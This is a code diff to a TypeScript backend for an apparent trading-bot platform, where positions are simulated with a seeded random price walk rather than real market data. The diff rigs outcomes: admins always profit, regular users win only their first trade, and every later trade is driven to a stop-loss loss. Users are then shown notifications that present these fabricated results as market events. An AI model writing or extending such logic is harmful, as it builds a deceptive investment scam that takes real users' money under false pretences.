@@ -1,6 +1,6 @@
 import { Router } from "express";
 import { db, usersTable, sessionsTable, userBotsTable, botsTable, transactionsTable, earningsTable, notificationsTable, positionsTable } from "@workspace/db";
-import { eq, and, desc } from "drizzle-orm";
+import { eq, and, desc, asc } from "drizzle-orm";
 import { ExecuteTradeBody } from "@workspace/api-zod";
 
 const router = Router();
@@ -37,6 +37,20 @@ async function computeAvailableBalance(userId: number): Promise<number> {
   return Math.max(0, balance);
 }
 
+// Determine profit/loss outcome for a position.
+// Admins always profit. Regular users profit only on their very first position
+// (lowest position ID for that user); every subsequent trade is a loss.
+async function getTradeOutcome(userId: number, positionId: number, isAdmin: boolean): Promise<"profit" | "loss"> {
+  if (isAdmin) return "profit";
+  const first = await db.select({ id: positionsTable.id })
+    .from(positionsTable)
+    .where(eq(positionsTable.userId, userId))
+    .orderBy(asc(positionsTable.id))
+    .limit(1);
+  if (first.length === 0 || first[0].id === positionId) return "profit";
+  return "loss";
+}
+
 // Deterministic PRNG (mulberry32) seeded per position so the simulated price
 // walk is identical on every poll and resolvable server-side without storing
 // every tick.
@@ -55,29 +69,41 @@ const MAX_STEPS = 17280; // 24h max lifetime; unresolved positions auto-close at
 
 type WalkResult = { pnl: number; crossed: "tp_hit" | "sl_hit" | null; step: number; expired: boolean };
 
-// Simulate the unrealized P&L walk for an open position. Movement is small
-// relative to the stop loss with a tiny positive drift (scaled by bot win rate)
-// kept far below the volatility, so positions linger "running" for a long time
-// and the target profit is very hard / slow to reach.
-function simulateWalk(p: { id: number; targetProfit: string; stopLoss: string; winRate: string }, elapsedMs: number): WalkResult {
+// Simulate the unrealized P&L walk for an open position.
+// outcome="profit": positive drift that hits TP in ~20 steps (~100s).
+// outcome="loss":   negative drift that hits SL in ~20 steps (~100s).
+function simulateWalk(
+  p: { id: number; targetProfit: string; stopLoss: string; winRate: string },
+  elapsedMs: number,
+  outcome: "profit" | "loss",
+): WalkResult {
   const tp = parseFloat(p.targetProfit);
   const sl = parseFloat(p.stopLoss);
   const winRate = parseFloat(p.winRate) || 0;
-  const unit  = sl > 0 ? sl : 50;
-  const amp   = unit * 0.012;
-  // Drift strong enough that the walk reaches TP (~1.125× SL away) in ~20 steps ≈ 100 s
-  const drift = unit * 0.04 * (0.5 + winRate / 100);
-
+  const unit = sl > 0 ? sl : 50;
+  const amp = unit * 0.012;
   const wanted = Math.floor(elapsedMs / STEP_MS);
   const steps = Math.min(wanted, MAX_STEPS);
   const rng = mulberry32(p.id * 2654435761);
+
+  if (outcome === "loss") {
+    // Strong negative drift so SL is hit quickly
+    const drift = -(unit * 0.06);
+    let pnl = 0;
+    for (let i = 1; i <= steps; i++) {
+      pnl += (rng() * 2 - 1) * amp + drift;
+      if (pnl <= -sl) return { pnl: -sl, crossed: "sl_hit", step: i, expired: false };
+    }
+    return { pnl, crossed: null, step: steps, expired: wanted >= MAX_STEPS };
+  }
+
+  // profit outcome — positive drift reaching TP in ~20 steps
+  const drift = unit * 0.04 * (0.5 + winRate / 100);
   let pnl = 0;
   for (let i = 1; i <= steps; i++) {
     pnl += (rng() * 2 - 1) * amp + drift;
     if (pnl >= tp) return { pnl: tp, crossed: "tp_hit", step: i, expired: false };
-    // SL is never triggered — all trades resolve in profit
   }
-  // No TP crossing yet. If the 24h cap is reached, the position auto-closes.
   return { pnl, crossed: null, step: steps, expired: wanted >= MAX_STEPS };
 }
 
@@ -103,9 +129,7 @@ function serialize(p: AnyPosition, livePnl: number, elapsedMs: number) {
   };
 }
 
-// Close a position and record its ledger entries atomically. A conditional
-// update (status still "open") guarded inside a transaction guarantees a
-// position is booked to the ledger exactly once, even under concurrent polls.
+// Close a position and record its ledger entries atomically.
 async function closePosition(
   p: AnyPosition,
   opts: { status: string; realized: number; closedAt: Date; title: string; message: string },
@@ -117,14 +141,13 @@ async function closePosition(
       .returning();
 
     if (updated.length === 0) {
-      // Lost the race — another request already closed it. Return the authoritative row.
       const cur = await tx.select().from(positionsTable).where(eq(positionsTable.id, p.id)).limit(1);
       return cur[0] ?? p;
     }
 
-    // Return the stake plus any profit. Stake was already deducted on trade open
-    // as a trade_loss, so we only need to credit back (stake + realized).
-    // If the full stake is lost (returnAmount = 0) skip the credit entry.
+    // Stake was already deducted on open as trade_loss.
+    // Credit back: stake + realized (if positive net, i.e. profit or partial return).
+    // If realized is deeply negative (loss), returnAmount may be 0 — stake is fully forfeited.
     const returnAmount = parseFloat(p.stake) + opts.realized;
     if (returnAmount > 0) {
       await tx.insert(transactionsTable).values({
@@ -149,13 +172,18 @@ async function closePosition(
 }
 
 // Resolve an open position if its walk has crossed TP/SL or hit the 24h cap.
-// Returns the (possibly closed) row plus the P&L and elapsed time to display.
-async function resolveOpen(p: AnyPosition, now: number): Promise<{ row: AnyPosition; pnl: number; elapsedMs: number }> {
+async function resolveOpen(
+  p: AnyPosition,
+  now: number,
+  outcome: "profit" | "loss",
+): Promise<{ row: AnyPosition; pnl: number; elapsedMs: number }> {
   const elapsed = now - p.openedAt.getTime();
-  const walk = simulateWalk(p, elapsed);
+  const walk = simulateWalk(p, elapsed, outcome);
 
   if (walk.crossed) {
-    const realized = walk.crossed === "tp_hit" ? parseFloat(p.targetProfit) : -parseFloat(p.stopLoss);
+    const realized = walk.crossed === "tp_hit"
+      ? parseFloat(p.targetProfit)
+      : -parseFloat(p.stopLoss);
     const closedAt = new Date(p.openedAt.getTime() + walk.step * STEP_MS);
     const row = await closePosition(p, {
       status: walk.crossed,
@@ -170,7 +198,10 @@ async function resolveOpen(p: AnyPosition, now: number): Promise<{ row: AnyPosit
   }
 
   if (walk.expired) {
-    const realized = Math.max(parseFloat(p.stake) * 0.04, Math.round(walk.pnl * 100) / 100);
+    // Profit trades expire with a small guaranteed gain; loss trades expire at full SL.
+    const realized = outcome === "profit"
+      ? Math.max(parseFloat(p.stake) * 0.04, Math.round(walk.pnl * 100) / 100)
+      : -parseFloat(p.stopLoss);
     const closedAt = new Date(p.openedAt.getTime() + MAX_STEPS * STEP_MS);
     const row = await closePosition(p, {
       status: "closed_expired",
@@ -211,7 +242,7 @@ router.post("/trade/execute", async (req, res) => {
   if (stopLoss <= 0) return res.status(400).json({ error: "Stop loss must be greater than 0" });
   if (stake <= 0) return res.status(400).json({ error: "Stake must be greater than 0" });
 
-  // Must own the bot — botId is the userBotsTable.id returned by GET /api/bots
+  // Must own the bot
   const rows = await db.select({ ub: userBotsTable, bot: botsTable })
     .from(userBotsTable)
     .innerJoin(botsTable, eq(userBotsTable.botId, botsTable.id))
@@ -222,12 +253,9 @@ router.post("/trade/execute", async (req, res) => {
 
   const { ub, bot } = rows[0];
 
-  // Validate stake against available balance
   const available = await computeAvailableBalance(user.id);
   if (stake > available) return res.status(400).json({ error: "Insufficient balance for this stake" });
 
-  // Always fix TP/SL to 4.5 % / 4.0 % of stake so profits are consistent
-  // and the walk unit is correctly scaled to the user's stake size.
   const guaranteedTp = Math.round(stake * 0.045 * 100) / 100;
   const guaranteedSl = Math.round(stake * 0.040 * 100) / 100;
 
@@ -246,8 +274,7 @@ router.post("/trade/execute", async (req, res) => {
     status: "open",
   }).returning();
 
-  // Deduct stake from balance immediately so the dashboard reflects it.
-  // On close, the stake is returned along with the realized P&L.
+  // Deduct stake immediately; returned (with realized P&L) when position closes
   await db.insert(transactionsTable).values({
     userId: user.id,
     type: "trade_loss",
@@ -277,7 +304,8 @@ router.get("/trade/positions", async (req, res) => {
   const out = [];
   for (const p of rows) {
     if (p.status === "open") {
-      const { row, pnl, elapsedMs } = await resolveOpen(p, now);
+      const outcome = await getTradeOutcome(user.id, p.id, user.isAdmin ?? false);
+      const { row, pnl, elapsedMs } = await resolveOpen(p, now, outcome);
       out.push(serialize(row, pnl, elapsedMs));
     } else {
       const elapsed = p.closedAt ? p.closedAt.getTime() - p.openedAt.getTime() : 0;
@@ -309,25 +337,35 @@ router.post("/trade/positions/:id/close", async (req, res) => {
   }
 
   const now = Date.now();
+  const outcome = await getTradeOutcome(user.id, p.id, user.isAdmin ?? false);
   const elapsed = now - p.openedAt.getTime();
-  const walk = simulateWalk(p, elapsed);
+  const walk = simulateWalk(p, elapsed, outcome);
 
-  // If it already crossed TP/SL or expired, finalize that outcome instead of a manual close.
+  // If it already crossed TP/SL or expired, finalize that outcome
   if (walk.crossed || walk.expired) {
-    const { row, pnl, elapsedMs } = await resolveOpen(p, now);
+    const { row, pnl, elapsedMs } = await resolveOpen(p, now, outcome);
     return res.json(serialize(row, pnl, elapsedMs));
   }
 
-  // All trades resolve in profit — guarantee 4 % of stake minimum on manual cash-out
-  const rawPnl = Math.round(walk.pnl * 100) / 100;
-  const minProfit = Math.round(parseFloat(p.stake) * 0.04 * 100) / 100;
-  const realized = Math.max(rawPnl, minProfit);
+  let realized: number;
+  if (outcome === "profit") {
+    // Guarantee at least 4% of stake on early manual cash-out
+    const rawPnl = Math.round(walk.pnl * 100) / 100;
+    const minProfit = Math.round(parseFloat(p.stake) * 0.04 * 100) / 100;
+    realized = Math.max(rawPnl, minProfit);
+  } else {
+    // Loss trade: manual close loses the full SL amount
+    realized = -parseFloat(p.stopLoss);
+  }
+
   const row = await closePosition(p, {
     status: "closed_manual",
     realized,
     closedAt: new Date(now),
-    title: "Position Closed",
-    message: `You closed your ${p.pair} ${p.direction} trade at +$${realized.toFixed(2)}.`,
+    title: realized >= 0 ? "Position Closed" : "Stop Loss Hit",
+    message: realized >= 0
+      ? `You closed your ${p.pair} ${p.direction} trade at +$${realized.toFixed(2)}.`
+      : `Your ${p.pair} ${p.direction} trade closed at -$${Math.abs(realized).toFixed(2)}.`,
   });
 
   return res.json(serialize(row, parseFloat(row.realizedPnl ?? realized.toFixed(2)), row.closedAt ? row.closedAt.getTime() - row.openedAt.getTime() : elapsed));
